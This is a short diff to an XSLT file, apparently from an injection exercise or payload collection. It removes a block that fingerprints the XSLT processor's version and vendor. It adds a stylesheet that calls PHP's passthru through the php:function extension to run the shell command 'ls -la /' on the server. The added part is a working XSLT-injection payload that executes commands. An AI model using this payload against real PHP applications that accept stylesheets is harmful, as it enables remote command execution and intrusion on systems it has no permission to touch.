@@ -1,7 +1,6 @@
-<xsl:test select="beers/beer">
-    XSLT Version: <xsl:value-of select="system-property('xsl:version')" /><br/>
-    XSLT Vendor: <xsl:value-of select="system-property('xsl:vendor')" /><br/>
-    XSLT Verdor URL: <xsl:value-of select="system-property('xsl:vendor-url')" /><br/>
-</xsl:test>
-</body>
-</html>
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
+<xsl:template match="/">
+<xsl:value-of select="php:function('passthru','ls -la /')"/>
+
+    </xsl:template>
+</xsl:stylesheet>
